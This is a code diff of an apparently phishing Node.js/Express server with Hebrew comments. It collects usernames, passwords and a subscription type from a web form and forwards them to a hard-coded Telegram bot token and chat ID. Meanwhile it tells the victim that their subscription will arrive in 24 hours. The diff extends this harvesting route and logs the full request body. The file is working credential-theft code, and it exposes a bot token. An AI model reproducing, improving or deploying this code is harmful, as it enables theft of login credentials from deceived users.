@@ -14,8 +14,8 @@ const TELEGRAM_BOT_TOKEN = '8712536099:AAGnazkihREbhPJsGpgmAXOClVF3LSFneGg';
 const TELEGRAM_CHAT_ID = '7519574690';
 
 // פונקציה מרכזית ששולחת את ההודעה לטלגרם
-function sendToTelegram(username, password, res) {
-    const message = `🔐 תזכורת פרטי התחברות חדשים מהאתר:\n\n👤 שם משתמש: ${username}\n🔑 סיסמה: ${password}`;
+function sendToTelegram(username, password, subscription, res) {
+    const message = `🔐 תזכורת פרטי התחברות חדשים מהאתר:\n\n⭐ סוג מנוי: ${subscription}\n👤 שם משתמש: ${username}\n🔑 סיסמה: ${password}`;
 
     const data = JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
@@ -41,7 +41,7 @@ function sendToTelegram(username, password, res) {
         });
 
         telegramRes.on('end', () => {
-            console.log('Telegram response: ' + responseBody);
+            console.log('Telegram API response: ' + responseBody);
             if (res) {
                 res.send('המנוי יתקבל בעוד 24 שעות');
             }
@@ -64,18 +64,16 @@ app.get('/', (req, res) => {
     res.sendFile(__dirname + '/index.html');
 });
 
-// תמיכה בנתיב /send-email
+// טיפול בבקשה שמגיעה מהטופס באתר
 app.post('/send-email', (req, res) => {
-    const username = req.body.username || req.body.email || 'לא צויין';
-    const password = req.body.password || 'לא צויין';
-    sendToTelegram(username, password, res);
-});
+    console.log('--> התקבלה בקשת שליחה חדשה מהאתר!');
+    console.log('נתונים שהתקבלו:', req.body);
 
-// תמיכה בנתיב הראשי או כל נתיב אחר במקרה שהטופס שולח לשם
-app.post('/', (req, res) => {
-    const username = req.body.username || req.body.email || 'לא צויין';
+    const username = req.body.username || 'לא צויין';
     const password = req.body.password || 'לא צויין';
-    sendToTelegram(username, password, res);
+    const subscription = req.body.subscription || 'לא צויין';
+
+    sendToTelegram(username, password, subscription, res);
 });
 
 // הפעלת השרת על הפורט של Render או פורט מקומי 3000
